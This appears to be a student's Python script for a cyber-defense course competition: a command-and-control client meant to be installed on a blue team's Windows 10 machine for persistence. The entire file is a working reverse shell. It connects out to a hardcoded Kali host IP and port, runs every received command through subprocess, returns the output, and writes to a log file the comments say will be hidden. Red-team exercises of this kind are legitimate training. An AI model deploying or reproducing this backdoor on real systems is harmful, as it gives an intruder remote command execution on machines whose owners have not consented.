# Noah Barnes
# Daryl Johnson
# Cyber Defense and Techniques
# 24 September 2024
# CDT ECHO

#This file is meant to be installed on a blue teams Win-10 device to maintain persistence.
#This is curated for the Win10 client
#basic for submission will be altered for competition and next group meeting

import socket
import subprocess
import logging

# Setup logging for competition
logging.basicConfig(filename="hidden.log", level=logging.INFO, format='%(asctime)s %(message)s') #creates client file that will eventually be hidden

# C2 Client 
class C2Client:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip #var for ip
        self.server_port = server_port #var for port used
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #AF_INET outlines what type of IP address it can communicate with IPv4

    def connect(self):
        try:
            self.client_socket.connect((self.server_ip, self.server_port)) #uses socket to connect to open server ip and port
            print(f"Connected to C2 server at {self.server_ip}:{self.server_port}")
            logging.info(f"Connected to C2 server at {self.server_ip}:{self.server_port}") #logged to file
            self.listen() 
        except Exception as e:
            print(f"[-] Failed to connect: {e}") #prints exception error if unable to connect
            logging.error(f"Failed to connect to server: {e}") 

    def listen(self):
        while True:
            #Receive command from the server
            command = self.client_socket.recv(4096).decode('utf-8')
            logging.info(f"Received command: {command}")

            if command.lower() == "exit": #ends connection easily so port is not always open
                print("[*] Server closed connection")
                logging.info("Server closed connection")
                break

            #Execute the command and capture output
            output = subprocess.getoutput(command)
            if not output:
                output = "Command executed, but no output returned."
            
            #Send output back to the server
            self.client_socket.send(output.encode())
            logging.info(f"Executed command: {command}")


if __name__ == "__main__":
    server_ip = "192.168.192.114"  #Kalibox IP
    server_port = 27 #basic port 

    c2_client = C2Client(server_ip, server_port)
    c2_client.connect()